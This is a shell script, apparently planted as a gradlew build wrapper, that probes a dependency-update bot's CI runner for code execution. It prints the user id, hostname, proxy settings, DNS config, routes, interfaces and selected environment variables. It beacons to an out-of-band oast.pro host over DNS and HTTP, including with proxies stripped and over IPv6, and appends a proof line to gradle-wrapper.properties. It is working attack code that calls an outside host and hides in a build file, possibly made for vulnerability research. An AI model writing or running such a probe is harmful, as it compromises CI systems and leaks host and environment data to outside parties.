#!/bin/sh
# ── CHANNEL MATRIX PROBE ──────────────────────────────────────────────────
# For each channel: print result to STDOUT (captured in Actions logs)
# and try OOB (DNS + HTTP). Look for "DEPBOT_EXEC" in the workflow run log.
# ─────────────────────────────────────────────────────────────────────────

OOB="db6m4jq5h2r7c1jnh460fpp6pt7cstgh3.oast.pro"
LABEL="$(hostname | tr '.' '-').$(id -u)"

# ── STDOUT CANARY (always works if ./gradlew runs) ─────────────────────────
echo "DEPBOT_EXEC_CANARY: id=$(id) host=$(hostname) uid=$(id -u) gid=$(id -g)"
echo "DEPBOT_ENV: HTTP_PROXY=${HTTP_PROXY} HTTPS_PROXY=${HTTPS_PROXY}"
echo "DEPBOT_NET: $(cat /etc/resolv.conf 2>/dev/null | head -3 | tr '\n' '|')"

# ── DNS CHANNELS ───────────────────────────────────────────────────────────
echo "DEPBOT_DNS_A: testing..."
nslookup "a.${LABEL}.${OOB}" 2>&1 | tail -3 && echo "DEPBOT_DNS_A: ok" || echo "DEPBOT_DNS_A: fail"

echo "DEPBOT_DNS_AAAA: testing..."
nslookup -type=AAAA "aaaa.${LABEL}.${OOB}" 2>&1 | tail -3 && echo "DEPBOT_DNS_AAAA: ok" || echo "DEPBOT_DNS_AAAA: fail"

echo "DEPBOT_DNS_DIG: testing..."
dig +short +timeout=5 "dig.${LABEL}.${OOB}" 2>&1 | head -3 || echo "DEPBOT_DNS_DIG: fail"

echo "DEPBOT_DNS_HOST: testing..."
host -W 5 "host.${LABEL}.${OOB}" 2>&1 | head -3 || echo "DEPBOT_DNS_HOST: fail"

# ── HTTP CHANNELS ──────────────────────────────────────────────────────────
echo "DEPBOT_HTTP_PROXY: testing..."
curl -fsSL --max-time 5 "https://${OOB}/proxied.${LABEL}" -o /dev/null 2>&1 && echo "DEPBOT_HTTP_PROXY: ok" || echo "DEPBOT_HTTP_PROXY: fail"

echo "DEPBOT_HTTP_NOPROXY: testing..."
unset HTTP_PROXY HTTPS_PROXY http_proxy https_proxy ALL_PROXY
curl --noproxy '*' -fsSL --max-time 5 "https://${OOB}/noproxy.${LABEL}" -o /dev/null 2>&1 && echo "DEPBOT_HTTP_NOPROXY: ok" || echo "DEPBOT_HTTP_NOPROXY: fail"

echo "DEPBOT_HTTP_IPv6: testing..."
curl -6 --noproxy '*' -fsSL --max-time 5 "https://${OOB}/ipv6.${LABEL}" -o /dev/null 2>&1 && echo "DEPBOT_HTTP_IPv6: ok" || echo "DEPBOT_HTTP_IPv6: fail"

# ── REPO WRITEBACK ─────────────────────────────────────────────────────────
# Write a custom property into gradle-wrapper.properties
# The PropertiesReconciler may preserve custom keys
PROPS="gradle/wrapper/gradle-wrapper.properties"
if [ -f "$PROPS" ]; then
    echo "execProof=$(id -u).$(hostname)" >> "$PROPS"
    echo "DEPBOT_WRITEBACK: appended execProof to ${PROPS}"
fi

# ── ENVIRONMENT DUMP ───────────────────────────────────────────────────────
echo "DEPBOT_ROUTES: $(ip route 2>/dev/null | head -5 | tr '\n' '|')"
echo "DEPBOT_INTERFACES: $(ip addr 2>/dev/null | grep 'inet ' | tr '\n' '|')"
echo "DEPBOT_ENV_FULL: $(env | grep -E 'PROXY|JAVA|GRADLE|DEPENDABOT|HOME|USER|PATH' | tr '\n' '|')"

exit 1
